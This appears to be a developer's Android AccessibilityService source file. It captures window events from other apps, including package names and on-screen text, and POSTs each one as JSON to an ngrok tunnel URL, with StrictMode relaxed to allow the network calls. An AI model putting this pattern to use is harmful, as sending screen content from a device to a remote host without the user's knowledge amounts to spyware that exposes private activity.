package com.example.ccessibilty;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.os.StrictMode;
import android.util.Log;
import android.view.View;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityRecord;
import android.view.accessibility.AccessibilityWindowInfo;

import androidx.core.accessibilityservice.AccessibilityServiceInfoCompat;

import org.json.JSONObject;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Calendar;

import javax.net.ssl.HttpsURLConnection;

public class myccserve extends AccessibilityService {
    private static final String TAG = "MyAccessibilityService";
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String str1= "EventType: "+event.getEventType();
        //String str2 = "Action: "+event.getAction();
        //String str3 = "AddedCount: "+event.getAddedCount() ;
        //String str4 = "BeforeText: "+event.getBeforeText() ;

        String str5= "Class: "+AccessibilityEvent.WINDOWS_CHANGE_TITLE;

        String str6 = "ClassName: "+event.getClassName();

       // String str7 = "ContentChangeTypes: "+event.getContentChangeTypes() ;

        String str8 = "ContentDescription: "+event.getContentDescription();

       // String str9 = "CurrentItemIndex: "+event.getCurrentItemIndex();

       // String str10 = "EventTime: "+ event.getEventTime() ;

        final Calendar c = Calendar.getInstance();
        String dte = String.valueOf(c.get(Calendar.DATE));
        String mnt = String.valueOf(c.get(Calendar.MONTH));
        String yer = String.valueOf(c.get(Calendar.YEAR));
        String sec = String.valueOf(c.get(Calendar.SECOND));
        String min =  String.valueOf(c.get(Calendar.MINUTE));
        String hr =  String.valueOf(c.get(Calendar.HOUR_OF_DAY));
        String mili = String.valueOf(c.get(Calendar.MILLISECOND));
     //   String str11= "EventType: "+event.getEventType() ;

       // String str12= "FromIndex: "+event.getFromIndex();

        //String str13= "ItemCount: "+event.getItemCount();


       // String str14= "MaxScrollY: "+event.getMaxScrollY() ;

       // String str15= "MovementGranularity: "+event.getMovementGranularity() ;

        String str16= "PackageName: "+event.getPackageName() ;

       // String str17= "ParcelableData: "+event.getParcelableData();

        //String str18= "RecordCount: "+event.getRecordCount() ;
//        String str19 = "RemovedCount: "+event.getRemovedCount() ;
//        String str20="ScrollX: "+event.getScrollX() ;
//        String str21="ScrollY: "+ event.getScrollY() ;

        String str22 = "Source: "+event.describeContents();

        String str23= "Text: "+event.getText() ;

       // String str24 = "ToIndex: "+event.getToIndex() ;


        String str25 = "WindowId: "+event.getWindowId() ;

        //////////////////////////////////////////////////////////////////////////////////////////
        Log.e(TAG, str1);
//        Log.e(TAG, str2);
//        Log.e(TAG, str3);
//        Log.e(TAG, str4);
        Log.e(TAG, str5);
        Log.e(TAG, str6);
      //  Log.e(TAG, str7);
        Log.e(TAG, str8);
//        Log.e(TAG, str9);
//        Log.e(TAG, str10);
//        Log.e(TAG, str11);
//        Log.e(TAG, str12);
//        Log.e(TAG, str13);
//        Log.e(TAG, str14);
      //  Log.e(TAG, str15);
        Log.e(TAG, str16);
//        Log.e(TAG, str17);
//        Log.e(TAG, str18);
//        Log.e(TAG, str19);
//        Log.e(TAG, str20);
//        Log.e(TAG, str21);
        Log.e(TAG, str22);
        Log.e(TAG, str23);
//        Log.e(TAG, str24);
        Log.e(TAG, str25);
//        Log.e(TAG, "onAccessibilityEvent:2 : "+event.getAction());
//        Log.e(TAG, str3);
//        Log.e(TAG, "onAccessibilityEvent:4 : "+event.getBeforeText());
//
//        Log.e(TAG, "onAccessibilityEvent:5 : "+event.getClass());
//
//        Log.e(TAG, "onAccessibilityEvent:6 : "+event.getClassName());
//
//        Log.e(TAG, "onAccessibilityEvent:7 : "+event.getContentChangeTypes());
//
//        Log.e(TAG, "onAccessibilityEvent:8 : "+event.getContentDescription());
//
//        Log.e(TAG, "onAccessibilityEvent:9 : "+event.getCurrentItemIndex() );
//        Log.e(TAG, "onAccessibilityEvent:10 : "+event.getContentDescription());
//        Log.e(TAG, "onAccessibilityEvent: 11: "+event.getCurrentItemIndex() );
//        Log.e(TAG, "onAccessibilityEvent: 12: "+event.getEventTime() );
//
//        Log.e(TAG, "onAccessibilityEvent:13:  "+event.getEventType());
//
//        Log.e(TAG, "onAccessibilityEvent:14:  "+event.getFromIndex());
//
//        Log.e(TAG, "onAccessibilityEvent:15:  "+event.getItemCount());
//
//        Log.e(TAG, "onAccessibilityEvent:16:  "+event.getMaxScrollX());
//
//        Log.e(TAG, "onAccessibilityEvent:17:  "+event.getMaxScrollY());
//
//        Log.e(TAG, "onAccessibilityEvent:18:  "+event.getMovementGranularity());
//
//        Log.e(TAG, "onAccessibilityEvent:19:  "+event.getPackageName());
//
//        Log.e(TAG, "onAccessibilityEvent:20:  "+event.getParcelableData());
//
//        Log.e(TAG, "onAccessibilityEvent:21:  "+event.getRecordCount());
//
//        Log.e(TAG, "onAccessibilityEvent:22:  "+event.getRemovedCount());
//
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
//            Log.e(TAG, "onAccessibilityEvent:23:  "+event.getScrollDeltaX());
//        }
//
//        Log.e(TAG, "onAccessibilityEvent:24:  "+event.getSource());
//
//        Log.e(TAG, "onAccessibilityEvent:25:  "+event.getText());
//
//        Log.e(TAG, "onAccessibilityEvent:26:  "+event.getToIndex());
//
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
//            Log.e(TAG, "onAccessibilityEvent:27:  "+event.getWindowChanges());
//        }
//
//        Log.e(TAG, "onAccessibilityEvent:28:  "+event.getWindowId());
//
//       // Log.e(TAG, "onAccessibilityEvent:29:  "+event.setContentChangeTypes(2, event);
//
//        Log.e(TAG, "onAccessibilityEvent: 30 : "+ AccessibilityRecord.obtain(event));


        Log.e(TAG,"----------------------------------------------------------");






        String str_tym = "event time: "+yer+"-"+mnt+"-"+dte+" "+hr+":"+min+":"+sec+":"+mili;

        String ln = "----------------------------------------------------------";
        String pott= ln+str1+"\n"+str5+"\n"+str6+"\n"+str8+"\n"+str16+"\n"+str22+"\n"+str23+"\n"+str25+"\n"+str_tym+"\n";
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            String dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS).getPath();
        }
//        try {
//
//            FileWriter wrt= new FileWriter(dir+"/timeStamp"+hr+"_"+min+".txt",true);
//
//            wrt.append(ln+str1+"\n"+str5+"\n"+str6+"\n"+str8+"\n"+str16+"\n"+str22+"\n"+str23+"\n"+str25+"\n"+str_tym+"\n");
//            wrt.close();
//
//        } catch (IOException e) {
//            e.printStackTrace();
//
//        }
//        class CallAPI extends AsyncTask<String, String, String> {
//
//            public CallAPI(){
//                //set context variables if required
//            }
//
//            @Override
//            protected void onPreExecute() {
//                super.onPreExecute();
//            }
//
//            @Override
//            protected String doInBackground(String... params) {
//                String urlString = "https://perfect-eel-fashion.cyclic.app/rawData/add"; // URL to call
//                String data = params[1]; //data to post
//                OutputStream out = null;
//
//                try {
//                    URL url = new URL(urlString);
//                    HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
//                    out = new BufferedOutputStream(urlConnection.getOutputStream());
//
//                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(out, "UTF-8"));
//                    writer.write(pott);
//                    writer.flush();
//                    writer.close();
//                    out.close();
//
//                    urlConnection.connect();
//                } catch (Exception e) {
//                    System.out.println(e.getMessage());
//                }
//            }
//        }
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();

        StrictMode.setThreadPolicy(policy);
        String urlString = "https://4465-122-169-93-39.in.ngrok.io/rawData/add"; // URL to call
       // String data = params[1]; //data to post
        OutputStream out = null;

        String response = "";

        try {
            URL url = new URL(urlString);
            HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
            urlConnection.setRequestMethod("POST");
            urlConnection.setRequestProperty("Content-Type", "application/json;charset=UTF-8");
            urlConnection.setRequestProperty("Accept","application/json");
            urlConnection.setDoOutput(true);
            urlConnection.setDoInput(true);

            JSONObject jsonBody = new JSONObject();
            jsonBody.put("data", pott);
            Log.i("jsonBody", jsonBody.toString());
            DataOutputStream o = new DataOutputStream(urlConnection.getOutputStream());
//            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(out, "UTF-8"));
//            writer.write(jsonBody.toString());
//            writer.flush();
//            writer.close();
            o.writeBytes(jsonBody.toString());

            o.flush();
            o.close();
//            int responseCode=urlConnection.getResponseCode();
//            if (responseCode == HttpsURLConnection.HTTP_OK) {
//                String line;
//                BufferedReader br=new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
//                while ((line=br.readLine()) != null) {
//                    response+=line;
//                    Log.e("resid",response);
//                }
//            }
//Log.e("resid", String.valueOf(urlConnection.getInputStream()));
            Log.e("connn",String.valueOf(urlConnection.getResponseCode()));
            Log.e("connn",String.valueOf(urlConnection.getResponseMessage()));


            urlConnection.disconnect();
        } catch (Exception e) {
            Log.e("techh", String.valueOf(e));
            System.out.println(e.getMessage());
        }
        /////////////
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            Log.d(TAG, "onAccessibilityEvent:event.getSource():-  "+source );
            AccessibilityNodeInfo rowNode = AccessibilityNodeInfo.obtain(source);
         Log.d(TAG, "onAccessibilityEvent: rowNode :- "+rowNode);
           // AccessibilityNodeInfo labelNode = rowNode.getChild(0);
//            AccessibilityNodeInfo completeNode = rowNode.getChild(1);
         //   CharSequence taskLabel = labelNode.getText();
//            CharSequence tasklbll= completeNode.getText();
           // Log.d(TAG, "onAccessibilityEvent:taskLabel :-  "+tasklbll );

          //  Log.d(TAG, "onAccessibilityEvent:taskLabel :-  "+taskLabel );

        }

    }

    @Override
    public void onInterrupt() {
        Log.e(TAG, "onInterrupt: Something went wrong" );


}
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();

//        info.eventTypes=AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS|
//        AccessibilityServiceInfo.CAPABILITY_CAN_RETRIEVE_WINDOW_CONTENT|
//        AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS|AccessibilityServiceInfo.CAPABILITY_CAN_REQUEST_ENHANCED_WEB_ACCESSIBILITY;
info.eventTypes = AccessibilityEvent.TYPE_WINDOWS_CHANGED|AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED|AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS|
        AccessibilityServiceInfo.CAPABILITY_CAN_RETRIEVE_WINDOW_CONTENT|AccessibilityServiceInfo.FEEDBACK_VISUAL|
        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS|AccessibilityEvent.WINDOWS_CHANGE_TITLE|
        AccessibilityEvent.WINDOWS_CHANGE_ADDED|AccessibilityEvent.WINDOWS_CHANGE_CHILDREN|
        AccessibilityServiceInfo.CONTENTS_FILE_DESCRIPTOR;//giving
//    info.eventTypes= AccessibilityEvent.CONTENT_CHANGE_TYPE_CONTENT_DESCRIPTION|
//            AccessibilityEvent.CONTENT_CHANGE_TYPE_DRAG_CANCELLED|
//            AccessibilityEvent.CONTENT_CHANGE_TYPE_DRAG_DROPPED|
//            AccessibilityEvent.CONTENT_CHANGE_TYPE_DRAG_STARTED|
//            AccessibilityEvent.CONTENT_CHANGE_TYPE_PANE_APPEARED|
//            AccessibilityEvent.CONTENT_CHANGE_TYPE_PANE_DISAPPEARED|
//            AccessibilityEvent.CONTENT_CHANGE_TYPE_PANE_TITLE|
//            AccessibilityEvent.CONTENT_CHANGE_TYPE_STATE_DESCRIPTION|
//            AccessibilityEvent.CONTENT_CHANGE_TYPE_SUBTREE|
//            AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT|
//            AccessibilityEvent.CONTENT_CHANGE_TYPE_UNDEFINED|
//            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED|
//            AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_END|
//            AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START|
//            AccessibilityEvent.TYPE_TOUCH_INTERACTION_END|
//            AccessibilityEvent.TYPE_TOUCH_INTERACTION_START|
//            AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED|
//            AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED|
//            AccessibilityEvent.TYPE_VIEW_CLICKED|
//            AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED|
//
//            AccessibilityEvent.TYPE_VIEW_HOVER_ENTER|
//            AccessibilityEvent.TYPE_VIEW_HOVER_EXIT|
//            AccessibilityEvent.TYPE_VIEW_LONG_CLICKED|
//            AccessibilityEvent.TYPE_VIEW_SCROLLED|
//            AccessibilityEvent.TYPE_VIEW_SELECTED|
//            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
//            |AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED|
//            AccessibilityEvent.TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY|
//            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED|
//            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED|
//            AccessibilityEvent.TYPE_WINDOWS_CHANGED|
//            AccessibilityEvent.TYPES_ALL_MASK|
//            AccessibilityEvent.WINDOWS_CHANGE_ACCESSIBILITY_FOCUSED|
//            AccessibilityEvent.WINDOWS_CHANGE_ACTIVE|
//            AccessibilityEvent.WINDOWS_CHANGE_ADDED|
//            AccessibilityEvent.WINDOWS_CHANGE_BOUNDS|
//            AccessibilityEvent.WINDOWS_CHANGE_CHILDREN|
//            AccessibilityEvent.WINDOWS_CHANGE_FOCUSED|
//            AccessibilityEvent.WINDOWS_CHANGE_LAYER|
//            AccessibilityEvent.WINDOWS_CHANGE_PARENT|
//            AccessibilityEvent.WINDOWS_CHANGE_PIP|
//            AccessibilityEvent.WINDOWS_CHANGE_TITLE|
//            AccessibilityEvent.WINDOWS_CHANGE_REMOVED;

  //   info.eventTypes=AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
//AccessibilityEvent.TYPE_VIEW_FOCUSED|
   info.feedbackType = AccessibilityServiceInfoCompat.FEEDBACK_ALL_MASK;
 info.flags= AccessibilityServiceInfoCompat.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
//
//        info.packageNames = new String[]
//          {"com.amazon.avod.thirdpartyclient"," com.spotify.music","com.netflix.mediaclient", "in.startv.hotstar","com.google.android.youtube","com.graymatrix.did","com.jio.media.jiobeats"};

        info.notificationTimeout = 100;

        this.setServiceInfo(info);
        Log.e(TAG, "onServiceConnected: ");
    }

}
